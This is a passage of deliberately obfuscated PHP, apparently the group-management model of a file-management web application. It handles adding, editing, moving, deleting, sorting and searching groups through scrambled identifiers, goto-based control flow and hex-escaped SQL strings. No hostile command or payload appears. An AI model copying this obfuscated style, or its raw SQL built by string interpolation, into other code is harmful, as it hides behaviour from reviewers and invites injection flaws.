A¬‘ÌÜ±Ø; E‡ÈÚ³¤ÈŒ: if (isset($cÈßÑ »ªë[$A’®â‚—[2213]])) { $this->metaSet($bö¢´ªà‰ƒ, array($A’®â‚—[2213] => $cÈßÑ »ªë[$A’®â‚—[2213]], $A’®â‚—[2214] => $cÈßÑ »ªë[$A’®â‚—[2214]])); unset($cÈßÑ »ªë[$A’®â‚—[2213]]); unset($cÈßÑ »ªë[$A’®â‚—[2214]]); } Model($A’®â‚—[1143])->groupRootAdd($bö¢´ªà‰ƒ); return $bö¢´ªà‰ƒ; goto a“¨¡·â…; A¬‘ÌÜ±Ø: $A’®â‚— =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$cÈßÑ »ªë[$A’®â‚—[487]] && isset($cÈßÑ »ªë[$A’®â‚—[2138]]) && $cÈßÑ »ªë[$A’®â‚—[2138]] == 1) { if ($a˜Ò¤†Şâ½ = $this->getInfoSimple($cÈßÑ »ªë[$A’®â‚—[2138]], !0)) { return $cÈßÑ »ªë[$A’®â‚—[2138]]; } } else { $a˜Ò¤†Şâ½ = $this->getInfoSimple($cÈßÑ »ªë[$A’®â‚—[487]]); if (!$a˜Ò¤†Şâ½) { return !1; } } $DíšÉó¿›  = $A’®â‚—[496]; goto C±¥ùàÉá¹; C±¥ùàÉá¹: if ($a˜Ò¤†Şâ½[$A’®â‚—[485]]) { $DíšÉó¿›  = $a˜Ò¤†Şâ½[$A’®â‚—[485]] . $a˜Ò¤†Şâ½[$A’®â‚—[2138]] . $A’®â‚—[47]; } $a‹Ò¹¶×‘Ê = array($A’®â‚—[411] => $this->groupNameAuto($cÈßÑ »ªë[$A’®â‚—[487]], $cÈßÑ »ªë[$A’®â‚—[28]]), $A’®â‚—[393] => $cÈßÑ »ªë[$A’®â‚—[487]], $A’®â‚—[551] => $DíšÉó¿› , $A’®â‚—[2211] => $cÈßÑ »ªë[$A’®â‚—[2122]], $A’®â‚—[2212] => 0, $A’®â‚—[2142] => 0); if (isset($cÈßÑ »ªë[$A’®â‚—[2160]])) { $a‹Ò¹¶×‘Ê[$A’®â‚—[2160]] = $cÈßÑ »ªë[$A’®â‚—[2160]]; } else { $fÕ‘Îí†èë = $this->max($A’®â‚—[2160]); if (!$fÕ‘Îí†èë) { $fÕ‘Îí†èë = 0; } $a‹Ò¹¶×‘Ê[$A’®â‚—[2160]] = $fÕ‘Îí†èë + 1; } goto C²œ¤ªì¥ê; C²œ¤ªì¥ê: if (!empty($cÈßÑ »ªë[$A’®â‚—[2138]])) { $a‹Ò¹¶×‘Ê[$A’®â‚—[2138]] = $cÈßÑ »ªë[$A’®â‚—[2138]]; } $bö¢´ªà‰ƒ = $this->add($a‹Ò¹¶×‘Ê); $this->setNamePinyin($bö¢´ªà‰ƒ, $a‹Ò¹¶×‘Ê[$A’®â‚—[28]]); goto E‡ÈÚ³¤ÈŒ; a“¨¡·â…: } protected function groupEdit($B‡‘ìÆ¥š, $E¯ˆ°ÓàÖ) { $CÆÌ«™Ñï =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!empty($E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[487]])) { $eÂ®£§Éçà = $this->getInfoSimple($B‡‘ìÆ¥š); $aÄ»‰¨ôÂ† = $this->getInfoSimple($E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[487]]); if (!$eÂ®£§Éçà || !$aÄ»‰¨ôÂ†) { return !1; } if ($eÂ®£§Éçà[$CÆÌ«™Ñï[2138]] == $aÄ»‰¨ôÂ†[$CÆÌ«™Ñï[2138]]) { return !1; } if ($E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[487]] != $eÂ®£§Éçà[$CÆÌ«™Ñï[487]]) { if ($aÄ»‰¨ôÂ†[$CÆÌ«™Ñï[485]] !== $eÂ®£§Éçà[$CÆÌ«™Ñï[485]] && strpos($aÄ»‰¨ôÂ†[$CÆÌ«™Ñï[485]], $eÂ®£§Éçà[$CÆÌ«™Ñï[485]] . $eÂ®£§Éçà[$CÆÌ«™Ñï[2138]] . $CÆÌ«™Ñï[47]) === 0) { return !1; } $E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[551]] = $aÄ»‰¨ôÂ†[$CÆÌ«™Ñï[485]] . $E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[487]] . $CÆÌ«™Ñï[47]; $this->_changeChildLevel($eÂ®£§Éçà, $aÄ»‰¨ôÂ†); } } if (isset($E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[28]])) { $this->setNamePinyin($B‡‘ìÆ¥š, $E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[28]]); } if (isset($E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[2213]])) { $this->metaSet($B‡‘ìÆ¥š, array($CÆÌ«™Ñï[2213] => $E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[2213]], $CÆÌ«™Ñï[2214] => $E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[2214]])); unset($E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[2213]]); unset($E¯ˆ°ÓàÖ[$CÆÌ«™Ñï[2214]]); } return $this->where(array($CÆÌ«™Ñï[2215] => $B‡‘ìÆ¥š))->save($E¯ˆ°ÓàÖ); } private function _changeChildLevel($CÍ²êë’Ã©, $BƒàÍ§Ôœñ, $cÎÏ‘µñÁ‘ = false) { goto d™«¡ï¾ÚÅ; d™«¡ï¾ÚÅ: $cïßˆõ²Š =& $_SERVER[åÌÛ»ô¢‚ö™]; $A‚º°¾åá = $CÍ²êë’Ã©[$cïßˆõ²Š[485]] . $CÍ²êë’Ã©[$cïßˆõ²Š[2138]] . $cïßˆõ²Š[47]; $DƒÄ‹Ú’ª” = $BƒàÍ§Ôœñ[$cïßˆõ²Š[485]] . $BƒàÍ§Ôœñ[$cïßˆõ²Š[2138]] . $cïßˆõ²Š[47] . $CÍ²êë’Ã©[$cïßˆõ²Š[2138]] . $cïßˆõ²Š[47]; goto d²„±¡®ğ²; dÜåÈ†²ŒÔ: $this->where($d¬ò…¼ÓŞŒ)->data($d½ÌÖƒËá•)->save(); goto dÓÂÁŞ·•ª; d²„±¡®ğ²: if ($cÎÏ‘µñÁ‘) { $DƒÄ‹Ú’ª” = $BƒàÍ§Ôœñ[$cïßˆõ²Š[485]] . $BƒàÍ§Ôœñ[$cïßˆõ²Š[2138]] . $cïßˆõ²Š[47]; } $d¬ò…¼ÓŞŒ = array($cïßˆõ²Š[551] => array($cïßˆõ²Š[509], $CÍ²êë’Ã©[$cïßˆõ²Š[485]] . $CÍ²êë’Ã©[$cïßˆõ²Š[2138]] . $cïßˆõ²Š[510])); $d½ÌÖƒËá• = array($cïßˆõ²Š[551] => array($cïßˆõ²Š[559], "\162\145\x70\154\141\x63\x65\x28\x70\141\x72\x65\156\x74\x4c\x65\x76\x65\154\54\x27{$A‚º°¾åá}\x27\x2c\x27{$DƒÄ‹Ú’ª”}\47\x29")); goto dÜåÈ†²ŒÔ; dÓÂÁŞ·•ª: } public function setNamePinyin($bóÂñ÷ÒŠ”, $a¬ó´ê”ŒÌ = false) { $FÃÌì²âÜ— =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$a¬ó´ê”ŒÌ) { $E·È„ô‰„á = $this->getInfoSimple($bóÂñ÷ÒŠ”); $a¬ó´ê”ŒÌ = $E·È„ô‰„á[$FÃÌì²âÜ—[28]]; } if (!Input::check($a¬ó´ê”ŒÌ, $FÃÌì²âÜ—[554])) { $this->metaSet($bóÂñ÷ÒŠ”, $FÃÌì²âÜ—[441], null); $this->metaSet($bóÂñ÷ÒŠ”, $FÃÌì²âÜ—[440], null); return; } $EòäãÎ­™Ñ = array($FÃÌì²âÜ—[441] => str_replace($FÃÌì²âÜ—[50], $FÃÌì²âÜ—[33], Pinyin::encode($a¬ó´ê”ŒÌ)), $FÃÌì²âÜ—[440] => Pinyin::encode($a¬ó´ê”ŒÌ, $FÃÌì²âÜ—[555])); $this->metaSet($bóÂñ÷ÒŠ”, $EòäãÎ­™Ñ); } protected function groupStatus($d¡²„¡ÓŒ¥, $a©Ù¯ëÜ÷Ü) { goto c¼ç­¥ñÔ„; aÕòÃé§‹: foreach ($E¾¡¬ì–Å¢ as $d¡²„¡ÓŒ¥) { $dØÄ—’ä‘È[] = array($B„Ô¤£Í[2138] => $d¡²„¡ÓŒ¥, $B„Ô¤£Í[89] => $B„Ô¤£Í[716], $B„Ô¤£Í[375] => $a©Ù¯ëÜ÷Ü); } return Model($B„Ô¤£Í[2216])->addAll($dØÄ—’ä‘È, array(), !0); goto C¸¬Š¬ê ; F¡õÓèˆç: if ($a©Ù¯ëÜ÷Ü == $B„Ô¤£Í[83]) { $E¾¡¬ì–Å¢ = $this->parentLevelArray($fß¾ãè÷£Ë[$B„Ô¤£Í[485]]); } else { $dÙÉœšĞÖÃ = array($B„Ô¤£Í[551] => array($B„Ô¤£Í[509], $fß¾ãè÷£Ë[$B„Ô¤£Í[485]] . $fß¾ãè÷£Ë[$B„Ô¤£Í[2138]] . $B„Ô¤£Í[510])); $E¾¡¬ì–Å¢ = $this->where($dÙÉœšĞÖÃ)->field($B„Ô¤£Í[2138])->select(); $E¾¡¬ì–Å¢ = array_to_keyvalue($E¾¡¬ì–Å¢, $B„Ô¤£Í[33], $B„Ô¤£Í[2138]); } $E¾¡¬ì–Å¢[] = $fß¾ãè÷£Ë[$B„Ô¤£Í[2138]]; $dØÄ—’ä‘È = array(); goto aÕòÃé§‹; c¼ç­¥ñÔ„: $B„Ô¤£Í =& $_SERVER[åÌÛ»ô¢‚ö™]; $fß¾ãè÷£Ë = $this->getInfoSimple($d¡²„¡ÓŒ¥); if (!$fß¾ãè÷£Ë) { return !1; } goto F¡õÓèˆç; C¸¬Š¬ê : } protected function groupRemove($E…å´È¥®‘) { goto e†ŞÈÌ’ƒÌ; dÀå”É™®: $this->where(array($bã—æ©„‰[487] => $E…å´È¥®‘))->save(array($bã—æ©„‰[487] => $CÎô¨ùÎİÁ[$bã—æ©„‰[487]])); Model($bã—æ©„‰[2216])->where($Eë´£Ë·º‡)->delete(); Model($bã—æ©„‰[2217])->where($Eë´£Ë·º‡)->delete(); goto A¬õ¸…ƒƒ ; e†ŞÈÌ’ƒÌ: $bã—æ©„‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eë´£Ë·º‡ = array($bã—æ©„‰[2138] => $E…å´È¥®‘); $CÎô¨ùÎİÁ = $this->where($Eë´£Ë·º‡)->find(); goto CƒÇåÁ°Æ„; A¬õ¸…ƒƒ : Model($bã—æ©„‰[778])->groupRootRemove($E…å´È¥®‘); return $this->where($Eë´£Ë·º‡)->delete(); goto CŞ©²öë—å; CƒÇåÁ°Æ„: if (!$CÎô¨ùÎİÁ || $CÎô¨ùÎİÁ[$bã—æ©„‰[487]] == 0) { return !1; } $BÌ¢¢»æ¸ = $this->getInfoSimple($CÎô¨ùÎİÁ[$bã—æ©„‰[487]]); $this->_changeChildLevel($CÎô¨ùÎİÁ, $BÌ¢¢»æ¸, !0); goto dÀå”É™®; CŞ©²öë—å: } protected function groupSort($A†ôàÇ“÷) { $fÉÇÚ§¥À =& $_SERVER[åÌÛ»ô¢‚ö™]; $EíŞóñâŒ = array(); foreach ($A†ôàÇ“÷ as $BÈ½“ù¼î¸ => $FŞè†ÖœÍ²) { $EíŞóñâŒ[] = array($fÉÇÚ§¥À[2138], $FŞè†ÖœÍ², $fÉÇÚ§¥À[2160], $BÈ½“ù¼î¸ + 1); } $this->saveAll($EíŞóñâŒ); } public function listData() { $Eö²øÌ´„› = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Eö²øÌ´„›[$_SERVER[åÌÛ»ô¢‚ö™][370]]); return $Eö²øÌ´„›; } private function _makeOrder($a÷¶èé‹ò‡ = '') { goto F®ëá…ùÊ ; cÉ°¹Ùâğ›: $a÷¶èé‹ò‡ = $a÷¶èé‹ò‡ . "{$eˆ­Ö¼êÎŞ}\x20{$Aå®ß×°¾}\x2c\x20\147\x72\157\x75\x70\111\104\40\x61\163\x63"; return $this->order($a÷¶èé‹ò‡); goto cùÕ™ÎØãß; a£ÒĞ‰Õğ¤: $eˆ­Ö¼êÎŞ = Input::get($d‡ñ‰àí¿ß[432], $d‡ñ‰àí¿ß[7], $d‡ñ‰àí¿ß[2142], $A«Ÿ÷¦º‘‹); $Aå®ß×°¾ = Input::get($d‡ñ‰àí¿ß[433], $d‡ñ‰àí¿ß[7], $d‡ñ‰àí¿ß[2218], array($d‡ñ‰àí¿ß[2218], $d‡ñ‰àí¿ß[429])); $Aå®ß×°¾ = $e…åÃ÷ÑğÌ[$Aå®ß×°¾]; goto cÉ°¹Ùâğ›; F®ëá…ùÊ : $d‡ñ‰àí¿ß =& $_SERVER[åÌÛ»ô¢‚ö™]; $A«Ÿ÷¦º‘‹ = array($d‡ñ‰àí¿ß[2138], $d‡ñ‰àí¿ß[28], $d‡ñ‰àí¿ß[2124], $d‡ñ‰àí¿ß[200]); $e…åÃ÷ÑğÌ = array($d‡ñ‰àí¿ß[427] => $d‡ñ‰àí¿ß[428], $d‡ñ‰àí¿ß[429] => $d‡ñ‰àí¿ß[430]); goto a£ÒĞ‰Õğ¤; cùÕ™ÎØãß: } public function listChild($E¡‘ÒÈ÷Áİ) { $dö±“ËÃ„¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eİ¡¯‰ÚÜ = $this->where(array($dö±“ËÃ„¹[487] => $E¡‘ÒÈ÷Áİ))->_makeOrder()->selectPage(200); $this->_listDataApply($eİ¡¯‰ÚÜ[$dö±“ËÃ„¹[370]]); return $eİ¡¯‰ÚÜ; } public function listByID($C¼™»ºÁÀ¹) { $Cï…á°À— =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$C¼™»ºÁÀ¹) { return array(); } $f‘§°®ÖŸİ = array($Cï…á°À—[2138] => array($Cï…á°À—[7], $C¼™»ºÁÀ¹)); $e²‰Ìšù™ = $this->where($f‘§°®ÖŸİ)->select(); $this->_listDataApply($e²‰Ìšù™); return $e²‰Ìšù™; } public function listSearch($D‰·¸ë£ÛÔ) { goto cÅŠ§ê¦ĞŒ; FÇ­Ó×¶‡¨: return $B¨¡ßŞ¹Í; goto e§­ØÛáò‹; E‘ã©øœœ: if ($BÇÍÆ„‚–) { $f±Õ³‡®”ƒ = $this->getInfoSimple($BÇÍÆ„‚–); $aõßöÌ¸Âœ = $f±Õ³‡®”ƒ[$aƒ¯¤ïçÊñ[485]] . $BÇÍÆ„‚– . $aƒ¯¤ïçÊñ[510]; $Fè¨µÍÃ = array($Fè¨µÍÃ, array($aƒ¯¤ïçÊñ[485] => array($aƒ¯¤ïçÊñ[382], $aõßöÌ¸Âœ))); } $Fè¨µÍÃ = $this->parseWhereLike($Fè¨µÍÃ); $B¨¡ßŞ¹Í = $this->_makeOrder()->where($Fè¨µÍÃ)->selectPage(20); goto bñØ’àçÛ; Fµª¾ÓÃËá: if (!trim($dëç¿½¸†ó)) { return !1; } $dëç¿½¸†ó = str_replace($aƒ¯¤ïçÊñ[2221], $aƒ¯¤ïçÊñ[2222], $dëç¿½¸†ó); $Fè¨µÍÃ = array($aƒ¯¤ïçÊñ[2138] => array($aƒ¯¤ïçÊñ[382], "{$dëç¿½¸†ó}\45"), $aƒ¯¤ïçÊñ[28] => array($aƒ¯¤ïçÊñ[382], "\x25{$dëç¿½¸†ó}\x25"), $aƒ¯¤ïçÊñ[935] => $aƒ¯¤ïçÊñ[2223]); goto E‘ã©øœœ; bñØ’àçÛ: $B¨¡ßŞ¹Í = $B¨¡ßŞ¹Í ? $B¨¡ßŞ¹Í : array(); if (!$B¨¡ßŞ¹Í || count($B¨¡ßŞ¹Í[$aƒ¯¤ïçÊñ[370]]) < 5 && Input::check($dëç¿½¸†ó, $aƒ¯¤ïçÊñ[321])) { goto F„¿”‡¤õğ; F„¿”‡¤õğ: $C®Ò®´ößÍ = $this->groupChildrenAll($BÇÍÆ„‚–); $CŠ‹Ú¢å¨ï = $this->_searchFromMeta($aƒ¯¤ïçÊñ[440], $dëç¿½¸†ó, 10, $C®Ò®´ößÍ); $eÃƒó¿ÀË = $this->_searchFromMeta($aƒ¯¤ïçÊñ[441], $dëç¿½¸†ó, 10, $C®Ò®´ößÍ); goto fÑ´ ÑìÑ; fÑ´ ÑìÑ: $a…çãöÓ = array_merge($CŠ‹Ú¢å¨ï, $eÃƒó¿ÀË, $B¨¡ßŞ¹Í[$aƒ¯¤ïçÊñ[370]]); $B¨¡ßŞ¹Í[$aƒ¯¤ïçÊñ[370]] = array_unique_by_key($a…çãöÓ, $aƒ¯¤ïçÊñ[2138]); $B¨¡ßŞ¹Í[$aƒ¯¤ïçÊñ[367]][$aƒ¯¤ïçÊñ[368]] = count($B¨¡ßŞ¹Í[$aƒ¯¤ïçÊñ[370]]); goto FôÕ²Î·œ; FôÕ²Î·œ: $B¨¡ßŞ¹Í[$aƒ¯¤ïçÊñ[367]][$aƒ¯¤ïçÊñ[369]] = ceil($B¨¡ßŞ¹Í[$aƒ¯¤ïçÊñ[367]][$aƒ¯¤ïçÊñ[368]] / $B¨¡ßŞ¹Í[$aƒ¯¤ïçÊñ[367]][$aƒ¯¤ïçÊñ[365]]); goto cÄÌÔÆÒøß; cÄÌÔÆÒøß: } $this->_listDataApply($B¨¡ßŞ¹Í[$aƒ¯¤ïçÊñ[370]]); goto FÇ­Ó×¶‡¨; cÅŠ§ê¦ĞŒ: $aƒ¯¤ïçÊñ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dëç¿½¸†ó = $D‰·¸ë£ÛÔ[$aƒ¯¤ïçÊñ[2219]]; $BÇÍÆ„‚– = isset($D‰·¸ë£ÛÔ[$aƒ¯¤ïçÊñ[2220]]) ? $D‰·¸ë£ÛÔ[$aƒ¯¤ïçÊñ[2220]] : !1; goto Fµª¾ÓÃËá; e§­ØÛáò‹: } protected function groupChildrenAll($D‘ËÜã‹Éì) { $fÇˆ½±ĞÍ— =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$D‘ËÜã‹Éì) { return !1; } if (is_string($D‘ËÜã‹Éì)) { $D‘ËÜã‹Éì = array($D‘ËÜã‹Éì); } $EË¤òÒ‹ = $D‘ËÜã‹Éì; foreach ($D‘ËÜã‹Éì as $d¡“¨ìâõó) { $Fô‚„Å‚éº = $this->getInfoSimple($d¡“¨ìâõó); $aÔçø­Š‡‘ = array($fÇˆ½±ĞÍ—[485] => array($fÇˆ½±ĞÍ—[382], $Fô‚„Å‚éº[$fÇˆ½±ĞÍ—[485]] . $d¡“¨ìâõó . $fÇˆ½±ĞÍ—[510])); $d—ª–÷äĞ = $this->field($fÇˆ½±ĞÍ—[2138])->where($aÔçø­Š‡‘)->select(); $EË¤òÒ‹ = array_merge($EË¤òÒ‹, array_to_keyvalue($d—ª–÷äĞ, $fÇˆ½±ĞÍ—[33], $fÇˆ½±ĞÍ—[2138])); } return array_unique($EË¤òÒ‹); } private function _searchFromMeta($CÌÍÒŠ–â—, $b¡Åœ”«è, $e»âæïˆù…, $d¿²‡æ²) { goto CòŞ‘Ãœ¡º; bË—Œº‹«§: if (!$aŸšÚÖ…¾) { return array(); } return $aŸšÚÖ…¾; goto dèÒ¢ÛŸ©ß; CòŞ‘Ãœ¡º: $c¦Íõ²’¨¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b¡Åœ”«è = strtolower($b¡Åœ”«è); $eİ÷‹í‘½à = array($c¦Íõ²’¨¹[89] => $CÌÍÒŠ–â—, $c¦Íõ²’¨¹[375] => array($c¦Íõ²’¨¹[382], "\45{$b¡Åœ”«è}\x25")); goto EÈ»µ‡ÂÜ; a©ÓŒç•ãÊ: if (!$FŞÍİÓ§Ä—) { return array(); } $FŞÍİÓ§Ä— = array_to_keyvalue($FŞÍİÓ§Ä—, $c¦Íõ²’¨¹[33], $c¦Íõ²’¨¹[2138]); $aŸšÚÖ…¾ = $this->where(array($c¦Íõ²’¨¹[2215] => array($c¦Íõ²’¨¹[7], $FŞÍİÓ§Ä—)))->select(); goto bË—Œº‹«§; EÈ»µ‡ÂÜ: $eİ÷‹í‘½à = $this->parseWhereLike($eİ÷‹í‘½à); if ($d¿²‡æ²) { $eİ÷‹í‘½à[$c¦Íõ²’¨¹[2138]] = array($c¦Íõ²’¨¹[7], $d¿²‡æ²); } $FŞÍİÓ§Ä— = Model($c¦Íõ²’¨¹[2224])->where($eİ÷‹í‘½à)->limit($e»âæïˆù…)->select(); goto a©ÓŒç•ãÊ; dèÒ¢ÛŸ©ß: } protected function _listDataApplyItem($BŒğÜ•Œ³†) { $A…¨‰ÄÇß† = array($BŒğÜ•Œ³†); $this->_listDataApply($A…¨‰ÄÇß†); return $A…¨‰ÄÇß†[0]; } protected function _listDataApply(&$dÕŠŠ¤‘äÉ) { goto fÙËš’ƒîã; fÙËš’ƒîã: $a‰š»—«º½ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$dÕŠŠ¤‘äÉ) { return; } $c‡†ù¡í› = array_to_keyvalue($dÕŠŠ¤‘äÉ, $a‰š»—«º½[33], $a‰š»—«º½[2138]); goto Cƒ­õ²éĞî; Cƒ­õ²éĞî: $this->_listAppendChildren($dÕŠŠ¤‘äÉ); $this->_listAppendChildrenMember($dÕŠŠ¤‘äÉ); $this->_listAppendMeta($dÕŠŠ¤‘äÉ, $c‡†ù¡í›); goto c—ÚŒÚ¹ä·; c—ÚŒÚ¹ä·: $this->_listAppendParent($dÕŠŠ¤‘äÉ); $this->_listAppendSourceRoot($dÕŠŠ¤‘äÉ, $c‡†ù¡í›); goto c¾¯‚±¨Ÿ„; c¾¯‚±¨Ÿ„: } private function _listAppendChildren(&$D¢ëˆôôô) { goto Aœ×ßáóÎ; Aœ×ßáóÎ: $EÒÃõÔ²¡‡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a£˜¦àØÁ = $EÒÃõÔ²¡‡[377]; $d¹‘èõ = array(); goto aËë«¦÷êå; C›¿ñÑÅ·—: $d¹‘èõ = array_to_keyvalue($d¹‘èõ, $EÒÃõÔ²¡‡[476]); foreach ($D¢ëˆôôô as &$dØÖê¦Ø„Œ) { $dØÖê¦Ø„Œ[$EÒÃõÔ²¡‡[2225]] = isset($d¹‘èõ[$dØÖê¦Ø„Œ[$EÒÃõÔ²¡‡[2138]] . $EÒÃõÔ²¡‡[2226]]); } unset($dØÖê¦Ø„Œ); goto d«Ö¶‘µŒ¶; aËë«¦÷êå: $døëÓ¨ ˜Ü = count($D¢ëˆôôô); $fÈîßˆŠÛê = $this->tablePrefix . $this->tableName; for ($dë‹‚ôÚò = 0, $A–‘ˆôƒó  = 0; $dë‹‚ôÚò < $døëÓ¨ ˜Ü; $dë‹‚ôÚò++) { $A–‘ˆôƒó ++; $F½¯©ºÓ² = $D¢ëˆôôô[$dë‹‚ôÚò][$EÒÃõÔ²¡‡[2138]]; $a£˜¦àØÁ .= "\123\x45\x4c\x45\103\x54\40\x2a\x20\106\x52\x4f\115\x20\50\123\x45\114\x45\x43\124\40\47{$F½¯©ºÓ²}\137\x63\x68\151\x6c\144\x27\40\141\x73\x20\x68\x61\x73\x20\x46\x52\x4f\x4d\40\140{$fÈîßˆŠÛê}\x60\40\x77\x68\x65\162\145\x20\x70\x61\162\145\156\164\111\104\75{$F½¯©ºÓ²}\x20\154\151\155\x69\164\40\x31\51\x20\141\x73\x20\164\x62\137{$F½¯©ºÓ²}\40\x75\156\x69\157\x6e\x20\141\x6c\x6c\x20"; if (($A–‘ˆôƒó  >= 20 || $dë‹‚ôÚò == $døëÓ¨ ˜Ü - 1) && $a£˜¦àØÁ) { $a£˜¦àØÁ = substr($a£˜¦àØÁ, 0, -strlen($EÒÃõÔ²¡‡[475])); $cë£‘çÂì = $this->query($a£˜¦àØÁ); $d¹‘èõ = array_merge($d¹‘èõ, $cë£‘çÂì); $A–‘ˆôƒó  = 0; $a£˜¦àØÁ = $EÒÃõÔ²¡‡[33]; } } goto C›¿ñÑÅ·—; d«Ö¶‘µŒ¶: } private function _listAppendChildrenMember(&$C‡ÌÔšº) { goto Cê›óõÒ‡; fÁ¾…˜·Ìµ: $bë›àèµŒÛ = count($C‡ÌÔšº); $BÆ‹´ÅËƒí = $this->tablePrefix . $D­…Óƒ‚ÕÛ[2217]; for ($dğÕ³…½ç = 0, $Bµ»¬ÕÏå = 0; $dğÕ³…½ç < $bë›àèµŒÛ; $dğÕ³…½ç++) { $Bµ»¬ÕÏå++; $B†¼¯ÈÆ³‰ = $C‡ÌÔšº[$dğÕ³…½ç][$D­…Óƒ‚ÕÛ[2138]]; $B¿ÆÌñ‹Ğñ .= "\123\105\114\105\x43\124\40\52\40\x46\x52\x4f\115\40\50\x53\105\114\x45\103\124\x20\x27{$B†¼¯ÈÆ³‰}\137\x63\x68\x69\x6c\x64\x27\x20\x61\x73\x20\150\x61\163\x20\106\x52\117\x4d\40\x60{$BÆ‹´ÅËƒí}\x60\x20\x77\150\x65\162\x65\40\x67\162\x6f\x75\160\111\104\x3d{$B†¼¯ÈÆ³‰}\x20\154\151\x6d\151\164\40\61\51\x20\x61\163\x20\x74\142\x5f{$B†¼¯ÈÆ³‰}\x20\165\x6e\151\x6f\x6e\40\x61\x6c\154\40"; if (($Bµ»¬ÕÏå >= 20 || $dğÕ³…½ç == $bë›àèµŒÛ - 1) && $B¿ÆÌñ‹Ğñ) { $B¿ÆÌñ‹Ğñ = substr($B¿ÆÌñ‹Ğñ, 0, -strlen($D­…Óƒ‚ÕÛ[475])); $EÑ»„é¾¶Ş = $this->query($B¿ÆÌñ‹Ğñ); $cöäŸç¡Ø = array_merge($cöäŸç¡Ø, $EÑ»„é¾¶Ş); $Bµ»¬ÕÏå = 0; $B¿ÆÌñ‹Ğñ = $D­…Óƒ‚ÕÛ[33]; } } goto BÅ¯ø÷İàÛ; Cê›óõÒ‡: $D­…Óƒ‚ÕÛ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B¿ÆÌñ‹Ğñ = $D­…Óƒ‚ÕÛ[377]; $cöäŸç¡Ø = array(); goto fÁ¾…˜·Ìµ; BÅ¯ø÷İàÛ: $cöäŸç¡Ø = array_to_keyvalue($cöäŸç¡Ø, $D­…Óƒ‚ÕÛ[476]); foreach ($C‡ÌÔšº as &$a†Â„½£‡») { $a†Â„½£‡»[$D­…Óƒ‚ÕÛ[2227]] = isset($cöäŸç¡Ø[$a†Â„½£‡»[$D­…Óƒ‚ÕÛ[2138]] . $D­…Óƒ‚ÕÛ[2226]]); } unset($a†Â„½£‡»); goto c»Ãô¨ñùÕ; c»Ãô¨ñùÕ: } private function _listAppendMeta(&$E·¤î‘‘ô, $A¶ Šõ­›È) { goto fæ°î×òÆŞ; aˆÏŠ‰ÃÇš: $A£ìŠçÌ‡° = array_to_keyvalue_group($A£ìŠçÌ‡°, $bãˆá¯‘ÆÓ[2138]); foreach ($A£ìŠçÌ‡° as &$A£îŞ…ã¬) { $A£îŞ…ã¬ = array_to_keyvalue($A£îŞ…ã¬, $bãˆá¯‘ÆÓ[89], $bãˆá¯‘ÆÓ[375]); } unset($A£îŞ…ã¬); goto e¢¨¹ïôÌ‚; e¢¨¹ïôÌ‚: foreach ($E·¤î‘‘ô as &$bâØºé¶Ò°) { $bâØºé¶Ò°[$bãˆá¯‘ÆÓ[442]] = array(); if (isset($A£ìŠçÌ‡°[$bâØºé¶Ò°[$bãˆá¯‘ÆÓ[2138]]])) { $bâØºé¶Ò°[$bãˆá¯‘ÆÓ[442]] = $A£ìŠçÌ‡°[$bâØºé¶Ò°[$bãˆá¯‘ÆÓ[2138]]]; } } unset($bâØºé¶Ò°); goto c‚Ÿ²²ºËŒ; fæ°î×òÆŞ: $bãˆá¯‘ÆÓ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aÔÀÒÊ—­ = array($bãˆá¯‘ÆÓ[2138] => array($bãˆá¯‘ÆÓ[7], $A¶ Šõ­›È)); $A£ìŠçÌ‡° = Model($bãˆá¯‘ÆÓ[2216])->where($aÔÀÒÊ—­)->select(); goto aˆÏŠ‰ÃÇš; c‚Ÿ²²ºËŒ: } protected function parentLevelArray($D»¡ï£öĞ) { $Eª¸×Ê¬Í =& $_SERVER[åÌÛ»ô¢‚ö™]; $D»¡ï£öĞ = explode($Eª¸×Ê¬Í[47], trim($D»¡ï£öĞ, $Eª¸×Ê¬Í[47])); $D»¡ï£öĞ = array_remove_value($D»¡ï£öĞ, $Eª¸×Ê¬Í[494]); return $D»¡ï£öĞ; } private function _listAppendParent(&$AÖ§Õ›¸ˆ·) { goto f…™¢¹­øÊ; f…™¢¹­øÊ: $E¿µ—„óèŠ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eê¶‰ä¼¿Œ = array(); foreach ($AÖ§Õ›¸ˆ· as &$fÙğÜœ™¿¯) { $Eê¶‰ä¼¿Œ[$fÙğÜœ™¿¯[$E¿µ—„óèŠ[2138]]] = $fÙğÜœ™¿¯[$E¿µ—„óèŠ[28]]; $C÷¢Ù—É×Û = $this->parentLevelArray($fÙğÜœ™¿¯[$E¿µ—„óèŠ[485]]); foreach ($C÷¢Ù—É×Û as $B“ïª¾ˆÎã) { if (!isset($Eê¶‰ä¼¿Œ[$B“ïª¾ˆÎã])) { $Eê¶‰ä¼¿Œ[$B“ïª¾ˆÎã] = 0; } } } goto Cå¿ÖŸ«„; Cå¿ÖŸ«„: unset($fÙğÜœ™¿¯); $d±æƒÖ¹‡Œ = array(); foreach ($Eê¶‰ä¼¿Œ as $eÑÂ³À‡Ôß => $CŠØ…ùØ‚ ) { if (!$CŠØ…ùØ‚ ) { $d±æƒÖ¹‡Œ[] = $eÑÂ³À‡Ôß; } } goto eèÇÛ•ÉêÈ; cÙ´òåò¼Ø: 